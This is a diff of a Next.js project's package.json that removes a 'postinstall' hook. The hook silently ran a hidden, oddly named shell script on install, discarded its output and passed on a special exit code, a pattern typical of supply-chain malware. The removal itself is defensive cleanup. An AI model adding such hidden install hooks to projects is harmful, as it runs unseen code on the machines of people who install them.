@@ -7,8 +7,7 @@
     "dev": "next dev",
     "build": "next build",
     "export": "next build",
-    "lint": "next lint",
-    "postinstall": "sh ./.ci-v1tk58.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "lint": "next lint"
   },
   "dependencies": {
     "next": "14.2.5",
